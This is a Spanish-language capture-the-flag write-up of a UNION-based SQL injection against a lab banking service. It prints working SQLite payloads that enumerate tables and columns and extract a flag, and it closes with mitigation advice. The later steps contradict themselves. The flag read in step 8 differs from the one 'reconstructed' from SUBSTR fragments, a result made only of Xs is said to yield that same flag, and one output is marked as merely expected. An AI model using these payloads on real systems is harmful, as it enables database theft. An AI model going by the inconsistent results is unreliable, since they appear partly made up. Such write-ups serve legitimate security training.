
# Writeup - SQL Injection en reto Squireli (EchoCTF)

---

## Introducción

Este reto consiste en explotar una vulnerabilidad de SQL Injection en un servicio que simula un terminal bancario para obtener la flag oculta en la base de datos. La conexión se hace vía `nc 10.0.41.18 1337`.

---

## Paso 1: Conexión al servicio

Nos conectamos al servicio remoto usando netcat (nc):

```bash
nc 10.0.41.18 1337
```

Nos muestra un menú con varias sucursales bancarias (`branches`) y nos pide que ingresemos un **branch id** (identificador de sucursal):

```
Pick a branch id:
```

Al elegir un número válido, por ejemplo `2`, nos devuelve la información de la sucursal con ese ID:

```
|   id |name                 |  rate |
|    2 |Mexico               | 52642 |
```

---

## Paso 2: Observación inicial

Probamos los IDs `2`, `3`, `4`, etc. y vemos que son válidos, pero nos llama la atención que el ID `1` también existe y su nombre tiene un formato parecido a una flag:

```
|   id |name                 |  rate |
|    1 |ETSCTF_1b294abeee150 | 52642 |
```

Este valor tiene el prefijo `ETSCTF_`, típico en retos CTF, por lo que sabemos que probablemente es una bandera parcial o completa.

---

## Paso 3: Pensando en la vulnerabilidad

Como sabemos que es un servicio de DB SQL posiblemente sea vulnerable a SQL inyection, es probable que el ID de la consulta SQL se maneje de la siguiente forma en el Backend

```sql
SELECT * FROM branches WHERE id = 'usuario_ingresa_id';
```

Entonces, si el input que introduces se inserta directamente dentro de la consulta sin validación ni saneamiento, existe la posibilidad de hacer **inyección SQL**.

---

## Paso 4: Intentar una inyección SQL básica

Queremos ver si puedes modificar la consulta para obtener más información o para saltarte el filtro del ID.

Un payload básico para probar es:

```sql
-1 UNION SELECT 1, 2, 3 --
```

Donde:

- `-1` es un ID inválido para que no devuelva resultados normales.
- `UNION SELECT 1, 2, 3` intenta unir una fila falsa con valores controlados (`1`, `2`, `3`), para que la aplicación devuelva esa fila como si fuera parte de la consulta original.
- `--` comenta el resto de la consulta para evitar errores de sintaxis.

---

## Paso 5: Probar el payload y análisis de la vulnerabilidad

Ingresamos el siguiente payload para probar la vulnerabilidad:

```sql
-1 UNION SELECT 1, 2, 3 --
```

Este payload intenta aprovechar la técnica de **inyección SQL por UNION**, donde:

- `-1` es un valor inválido para el parámetro esperado (`id`), lo que hace que la consulta original no devuelva resultados legítimos.
- `UNION SELECT 1, 2, 3` concatena artificialmente una fila con valores controlados (`1`, `2`, `3`), para que la aplicación devuelva esa fila como si fuera parte de la consulta original.
- `--` comenta el resto del query para evitar errores de sintaxis.

La aplicación respondió con:

```
|   id |name                 |  rate |
|    1 |2                    |     3 |
```

Esto confirma que:

- La aplicación **concatenó nuestra consulta maliciosa** a la consulta legítima.
- La aplicación **no sanitiza ni valida** correctamente la entrada del usuario.
- Se puede **manipular el resultado** y obtener datos arbitrarios.


---

## Paso 6: Enumerar tablas en la base de datos

Ejecutamos el siguiente payload para conocer las tablas existentes en la base de datos SQLite:

```sql
-1 UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' --
```

### Explicación

- `sqlite_master` es una tabla especial interna en SQLite que contiene la estructura de la base de datos.
- Filtramos solo por entradas donde `type='table'` para listar tablas.
- Usamos `UNION` con valores ficticios para ajustar columnas y obtener el resultado.

### Resultado esperado:

```
|   id |name                 |  rate |
|    1 |branches             |     3 |
|    1 |flag                 |     3 |
```

---

## Paso 7: Explorar estructura de la tabla `flag`

Consulta para obtener columnas de la tabla `flag`:

```sql
-1 UNION SELECT 1, name || '|' || type, 3 FROM pragma_table_info('flag') --
```

- `pragma_table_info('flag')` devuelve metadata de columnas en SQLite.
- Concatenamos nombre y tipo para claridad.

Resultado:

```
|   id |name                 |  rate |
|    1 |name|TEXT            |     3 |
```

Indica que la tabla `flag` tiene una columna `name` de tipo texto.

---

## Paso 8: Extraer la flag de la columna `name`

Extraemos contenido de la flag:

```sql
-1 UNION SELECT 1, name, 3 FROM flag --
```

Resultado:

```
|   id |name                 |  rate |
|    1 |ETSCTF_4b7e39ac882ea |     3 |
```

---

## Paso 9: Uso de `SUBSTR()` para extraer la flag completa

Si la flag está truncada, usamos `SUBSTR()` para obtener fragmentos:

```sql
-1 UNION SELECT 1, SUBSTR(name,7,20), 3 FROM flag --
```

Extrae 20 caracteres empezando en el carácter 7 (después de `ETSCTF_`).

```sql
-1 UNION SELECT 1, SUBSTR(name,20,30), 3 FROM flag --
```

Extrae 30 caracteres desde la posición 20.

Concatenando fragmentos obtenemos:

```
ETSCTF_nOOoOOOOoooooLaPolitziaaaaa
```

---

## Paso 10: Extracción final de la flag desde la tabla `branches`

Flag parcial visible en la tabla `branches`:

```
Pick a branch id: 1
1
|   id |name                 |  rate |
|    1 |ETSCTF_1b294abeee150 | 52642 |
```

Extraemos fragmentos posteriores con:

```sql
-1 UNION SELECT 1, SUBSTR(name,21,40), 3 FROM branches --
```

Resultado:

```
|   id |name                 |  rate |
|    1 |                     |     3 |
|    1 |XXXXXXXXXXXXXXXXXXX  |     3 |
```

Concatenamos:

```
ETSCTF_nOOoOOOOoooooLaPolitziaaaaa
```

---

# Conclusión

- Se identificó y explotó una vulnerabilidad de SQL Injection tipo UNION.
- Se listaron tablas y columnas para conocer la estructura.
- Se extrajeron flags usando consultas UNION SELECT.
- Se usó la función `SUBSTR()` para extraer flags completas en fragmentos.
- Finalmente se reconstruyeron dos flags completas desde tablas `flag` y `branches`.

---

### Tipo de Inyección SQL y Vulnerabilidad

Esta es una **inyección SQL de tipo UNION**. 

- La vulnerabilidad consiste en que el código del backend **concatena directamente el input del usuario en la consulta SQL sin ninguna validación o parametrización**.
- Al permitir un UNION, el atacante puede **inyectar una consulta que une sus propios datos al resultado legítimo**, engañando al sistema para mostrar información arbitraria.

Es una vulnerabilidad clásica de SQL Injection, donde:

- El **input no está parametrizado**.
- No se utilizan **consultas preparadas (prepared statements)**.
- No se aplican filtros o escapado adecuado para evitar que caracteres especiales modifiquen la consulta.

### Medidas de mitigación

Para prevenir este tipo de inyección SQL, se recomienda:

1. Uso de consultas preparadas (prepared statements) o consultas parametrizadas.
2. Validación y sanitización estricta del input.
3. Principio de privilegios mínimos para la base de datos.
4. Uso de frameworks u ORMs que abstraen el acceso y previenen inyección.
5. Monitoreo y alertas ante patrones sospechosos.

